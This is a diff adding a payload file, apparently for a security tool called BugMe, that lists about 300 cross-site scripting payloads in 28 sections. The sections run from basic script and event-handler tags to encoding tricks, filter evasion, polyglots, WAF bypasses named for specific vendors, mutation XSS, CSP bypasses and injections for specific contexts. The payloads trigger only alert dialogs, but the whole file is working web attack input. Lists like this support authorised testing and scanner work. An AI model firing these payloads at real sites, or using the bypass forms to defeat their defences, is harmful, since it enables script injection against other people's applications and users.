@@ -1,0 +1,581 @@
+# ========================================
+# BugMe - Comprehensive XSS Payloads
+# From Basic to Advanced with Evasion
+# ========================================
+
+# ========================================
+# SECTION 1: BASIC PAYLOADS
+# ========================================
+
+# Simple script tags
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+
+# Basic image tags
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=confirm(1)>
+<img src=x onerror=prompt(1)>
+
+# Basic SVG
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=alert('XSS')>
+
+# Basic body tag
+<body onload=alert(1)>
+<body onload=alert('XSS')>
+
+# ========================================
+# SECTION 2: EVENT HANDLERS
+# ========================================
+
+# Mouse events
+<img src=x onerror=alert(1)>
+<img src=x onmouseover=alert(1)>
+<div onmouseover=alert(1)>hover</div>
+<div onclick=alert(1)>click</div>
+<div ondblclick=alert(1)>double click</div>
+<div onmousedown=alert(1)>mouse down</div>
+<div onmouseup=alert(1)>mouse up</div>
+<div onmousemove=alert(1)>move mouse</div>
+
+# Focus events
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<video onfocus=alert(1) autofocus>
+<audio onfocus=alert(1) autofocus>
+
+# Load events
+<body onload=alert(1)>
+<iframe onload=alert(1)>
+<img onload=alert(1) src=x>
+<svg onload=alert(1)>
+<style onload=alert(1)>
+
+# Other events
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<input onchange=alert(1)>
+<video onplay=alert(1)>
+<audio onplay=alert(1)>
+
+# ========================================
+# SECTION 3: ATTRIBUTE BREAKING
+# ========================================
+
+# Double quote breaking
+" onload="alert(1)
+" onfocus="alert(1)" autofocus="
+" onclick="alert(1)
+" onmouseover="alert(1)
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+
+# Single quote breaking
+' onload='alert(1)
+' onfocus='alert(1)' autofocus='
+' onclick='alert(1)
+' onmouseover='alert(1)
+'><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+
+# No quotes
+onload=alert(1)
+onfocus=alert(1) autofocus
+onclick=alert(1)
+
+# ========================================
+# SECTION 4: JAVASCRIPT CONTEXT
+# ========================================
+
+# String breaking
+'; alert(1); //
+"; alert(1); //
+'; alert(1); var x='
+"; alert(1); var x="
+'-alert(1)-'
+"-alert(1)-"
+
+# Expression injection
+-alert(1)-
++alert(1)+
+*alert(1)*
+/alert(1)/
+%alert(1)%
+
+# Function context
+)alert(1)//
+);alert(1);//
+'));alert(1);//
+"));alert(1);//
+
+# Template literals
+${alert(1)}
+`${alert(1)}`
+
+# ========================================
+# SECTION 5: URL CONTEXT
+# ========================================
+
+# JavaScript protocol
+javascript:alert(1)
+javascript:alert('XSS')
+javascript:alert(document.domain)
+javascript:alert(document.cookie)
+javascript://comment%0aalert(1)
+javascript:void(alert(1))
+
+# Data URI
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:text/html,<img src=x onerror=alert(1)>
+
+# ========================================
+# SECTION 6: CASE VARIATION EVASION
+# ========================================
+
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<sCrIpT>alert(1)</sCrIpT>
+<IMG SRC=x ONERROR=alert(1)>
+<ImG sRc=x OnErRoR=alert(1)>
+<SVG ONLOAD=alert(1)>
+<SvG oNlOaD=alert(1)>
+<BoDy OnLoAd=alert(1)>
+
+# ========================================
+# SECTION 7: NULL BYTE INJECTION
+# ========================================
+
+<script\x00>alert(1)</script>
+<img\x00src=x onerror=alert(1)>
+<svg\x00onload=alert(1)>
+<iframe\x00onload=alert(1)>
+
+# ========================================
+# SECTION 8: COMMENT INJECTION
+# ========================================
+
+<!--><script>alert(1)</script>
+<!--><img src=x onerror=alert(1)>
+<!--><svg onload=alert(1)>
+<script><!--
+alert(1)
+--></script>
+
+# ========================================
+# SECTION 9: ENCODING EVASION
+# ========================================
+
+# HTML entity encoding
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+
+# Unicode encoding
+\u003cscript\u003ealert(1)\u003c/script\u003e
+\x3cscript\x3ealert(1)\x3c/script\x3e
+
+# URL encoding
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+
+# Double URL encoding
+%253Cscript%253Ealert(1)%253C/script%253E
+
+# Mixed encoding
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+
+# ========================================
+# SECTION 10: FILTER BYPASS
+# ========================================
+
+# Space bypass
+<img/src=x/onerror=alert(1)>
+<svg/onload=alert(1)>
+<iframe/onload=alert(1)>
+<body/onload=alert(1)>
+
+# Tab/newline bypass
+<img	src=x	onerror=alert(1)>
+<img
+src=x
+onerror=alert(1)>
+
+# Comment bypass
+<img src=x one/**/rror=alert(1)>
+<scr<!---->ipt>alert(1)</scr<!---->ipt>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+
+# Nested tags
+<<script>script>alert(1)<</script>/script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<i<i>mg src=x onerror=alert(1)>
+
+# ========================================
+# SECTION 11: ADVANCED VECTORS
+# ========================================
+
+# SVG advanced
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1)>
+<svg><set onbegin=alert(1)>
+<svg><animatetransform onbegin=alert(1)>
+<svg><foreignobject><script>alert(1)</script></foreignobject></svg>
+
+# Math/XML
+<math><mi xlink:href="javascript:alert(1)">click</mi></math>
+<math><mtext><script>alert(1)</script></mtext></math>
+
+# Form-based
+<form action=javascript:alert(1)><input type=submit>
+<form><button formaction=javascript:alert(1)>click
+<isindex action=javascript:alert(1) type=submit>
+
+# Link-based
+<a href=javascript:alert(1)>click</a>
+<a href="javascript:alert(1)">click</a>
+<a href='javascript:alert(1)'>click</a>
+
+# Meta refresh
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+
+# Object/Embed
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+
+# ========================================
+# SECTION 12: POLYGLOT PAYLOADS
+# ========================================
+
+# Works in multiple contexts
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+# Multi-context polyglot
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'">
+
+# Short polyglot
+'"><img src=x onerror=alert(1)>
+
+# ========================================
+# SECTION 13: WAF BYPASS TECHNIQUES
+# ========================================
+
+# Cloudflare bypass
+<svg/onload=alert(1)>
+<iframe/onload=alert(1)>
+<details/open/ontoggle=alert(1)>
+
+# ModSecurity bypass
+<img src=x onerror=alert`1`>
+<svg onload=alert`1`>
+<img src=x onerror=alert\u0028 1\u0029>
+
+# Akamai bypass
+<script>alert(1)</script>
+<img src=x:alert(1) onerror=alert(1)>
+
+# Imperva bypass
+<svg><script>alert(1)</script></svg>
+<math><mtext><script>alert(1)</script></mtext></math>
+
+# Generic WAF bypass
+<img src=x onerror=\u0061lert(1)>
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+<img src=x onerror=eval('\x61lert(1)')>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+
+# ========================================
+# SECTION 14: MUTATION XSS (mXSS)
+# ========================================
+
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<noembed><p title="</noembed><img src=x onerror=alert(1)>">
+<noframes><p title="</noframes><img src=x onerror=alert(1)>">
+<style><style/><img src=x onerror=alert(1)>
+<listing><listing><img src=x onerror=alert(1)>
+
+# ========================================
+# SECTION 15: DOM-BASED XSS
+# ========================================
+
+# Location-based
+#<script>alert(1)</script>
+#<img src=x onerror=alert(1)>
+
+# Document.write
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+
+# innerHTML
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+
+# eval-based
+<script>eval('alert(1)')</script>
+<script>eval(location.hash.slice(1))</script>
+
+# ========================================
+# SECTION 16: ADVANCED EVASION
+# ========================================
+
+# Using different brackets
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert[1]>
+<img src=x onerror=alert{1}>
+
+# Using backticks
+<img src=x onerror=alert`1`>
+<svg onload=alert`1`>
+
+# Using template strings
+<script>alert`1`</script>
+<script>`${alert(1)}`</script>
+
+# Octal encoding
+<img src=x onerror=alert(\061)>
+<img src=x onerror=\141\154\145\162\164(1)>
+
+# Hex encoding
+<img src=x onerror=alert(\x31)>
+<img src=x onerror=\x61\x6c\x65\x72\x74(1)>
+
+# Unicode escape
+<img src=x onerror=alert(\u0031)>
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+
+# ========================================
+# SECTION 17: PROTOCOL HANDLERS
+# ========================================
+
+javascript:alert(1)
+javascript:alert('XSS')
+javascript:void(alert(1))
+javascript://comment%0aalert(1)
+javascript:/*comment*/alert(1)
+javascript:%0aalert(1)
+javascript:%0dalert(1)
+javascript:%09alert(1)
+vbscript:msgbox(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# ========================================
+# SECTION 18: LESS COMMON TAGS
+# ========================================
+
+<marquee onstart=alert(1)>XSS</marquee>
+<details open ontoggle=alert(1)>
+<keygen onfocus=alert(1) autofocus>
+<video><source onerror=alert(1)>
+<audio><source onerror=alert(1)>
+<input type=image src=x onerror=alert(1)>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<button onclick=alert(1)>click</button>
+<base href=javascript:alert(1)//>
+
+# ========================================
+# SECTION 19: CSS-BASED XSS
+# ========================================
+
+<style>*{background:url('javascript:alert(1)')}</style>
+<style>@import'javascript:alert(1)';</style>
+<style>body{background:url('javascript:alert(1)')}</style>
+<link rel=stylesheet href=javascript:alert(1)>
+<style>*{x:expression(alert(1))}</style>
+
+# ========================================
+# SECTION 20: BROWSER-SPECIFIC
+# ========================================
+
+# IE-specific
+<img src=x onerror=alert(1) style=x:expression(alert(1))>
+<div style=width:expression(alert(1))>
+<? foo="><script>alert(1)</script>">
+
+# Firefox-specific
+<script>alert(1)</script>
+<svg><script>alert(1)</script></svg>
+
+# Chrome-specific
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+
+# Safari-specific
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+
+# ========================================
+# SECTION 21: OBFUSCATION TECHNIQUES
+# ========================================
+
+# String concatenation
+<script>alert(1+''+'')</script>
+<script>alert('X'+'S'+'S')</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+
+# Eval obfuscation
+<script>eval('al'+'ert(1)')</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+
+# Function constructor
+<script>Function('alert(1)')()</script>
+<script>[].constructor.constructor('alert(1)')()</script>
+
+# Indirect eval
+<script>(1,eval)('alert(1)')</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>setInterval('alert(1)',0)</script>
+
+# ========================================
+# SECTION 22: CSP BYPASS ATTEMPTS
+# ========================================
+
+# JSONP endpoints
+<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
+
+# AngularJS (old versions)
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+
+# VueJS
+{{constructor.constructor('alert(1)')()}}
+
+# Prototype pollution
+<script>Object.prototype.src='data:,alert(1)'</script><img>
+
+# ========================================
+# SECTION 23: BREAKING OUT OF TAGS
+# ========================================
+
+# Breaking out of script
+</script><script>alert(1)</script>
+</script><img src=x onerror=alert(1)>
+
+# Breaking out of style
+</style><script>alert(1)</script>
+</style><img src=x onerror=alert(1)>
+
+# Breaking out of title
+</title><script>alert(1)</script>
+</title><img src=x onerror=alert(1)>
+
+# Breaking out of textarea
+</textarea><script>alert(1)</script>
+</textarea><img src=x onerror=alert(1)>
+
+# ========================================
+# SECTION 24: ADVANCED FILTER BYPASS
+# ========================================
+
+# Using HTML entities in attributes
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
+
+# Using different quotes
+<img src='x' onerror='alert(1)'>
+<img src="x" onerror="alert(1)">
+<img src=`x` onerror=`alert(1)`>
+
+# No quotes at all
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+
+# Mixed case with encoding
+<ScRiPt>&#97;&#108;&#101;&#114;&#116;(1)</ScRiPt>
+
+# ========================================
+# SECTION 25: EXOTIC VECTORS
+# ========================================
+
+# Using XML namespaces
+<html xmlns:xss><xss:script>alert(1)</xss:script></html>
+
+# Using meta tags
+<meta http-equiv="refresh" content="0;javascript:alert(1)">
+<meta http-equiv="Set-Cookie" content="test=<script>alert(1)</script>">
+
+# Using link tags
+<link rel=import href="data:text/html,<script>alert(1)</script>">
+
+# Using import
+<script>import('data:text/javascript,alert(1)')</script>
+
+# Using service workers
+<script>navigator.serviceWorker.register('data:text/javascript,alert(1)')</script>
+
+# ========================================
+# SECTION 26: CONTEXT-SPECIFIC PAYLOADS
+# ========================================
+
+# Inside HTML tag
+<div>PAYLOAD</div>
+Payload: <script>alert(1)</script>
+
+# Inside attribute value
+<input value="PAYLOAD">
+Payload: " onfocus=alert(1) autofocus="
+
+# Inside JavaScript string
+<script>var x = "PAYLOAD";</script>
+Payload: "; alert(1); //
+
+# Inside JavaScript code
+<script>var x = PAYLOAD;</script>
+Payload: alert(1)
+
+# Inside URL
+<a href="PAYLOAD">click</a>
+Payload: javascript:alert(1)
+
+# Inside CSS
+<style>body { background: PAYLOAD; }</style>
+Payload: url('javascript:alert(1)')
+
+# ========================================
+# SECTION 27: REAL-WORLD SCENARIOS
+# ========================================
+
+# Search parameter
+?search=<script>alert(1)</script>
+?q=<img src=x onerror=alert(1)>
+?query="><script>alert(1)</script>
+
+# Redirect parameter
+?redirect=javascript:alert(1)
+?url=javascript:alert(1)
+?return=javascript:alert(1)
+
+# Callback parameter
+?callback=alert(1)
+?jsonp=alert
+?cb=alert
+
+# Error message
+error=<script>alert(1)</script>
+msg=<img src=x onerror=alert(1)>
+
+# ========================================
+# SECTION 28: SHORTEST PAYLOADS
+# ========================================
+
+<script>alert(1)</script>
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+
+# ========================================
+# END OF COMPREHENSIVE PAYLOADS
+# Total: 300+ unique XSS payloads
+# ========================================
